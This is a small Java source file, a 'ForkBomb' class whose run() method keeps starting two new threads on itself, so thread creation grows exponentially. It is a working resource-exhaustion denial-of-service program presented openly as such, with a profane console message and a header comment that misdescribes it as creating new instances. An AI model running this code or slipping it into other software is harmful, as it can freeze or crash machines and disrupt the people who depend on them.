package src;

/*
 * This program creates an instance of ForkBomb and runs run(), in 
 * which two new instances of ForkBomb will be created which also will run run();
 */

public class ForkBomb implements Runnable {
	
	public ForkBomb() {
		System.out.println("forkBOMBed b!tch");
	}
	
	@Override
	public void run() {
		new Thread(this).start();
		new Thread(this).start();
	}

	public static void main(String[] args) {
		new ForkBomb().run();
	}

}
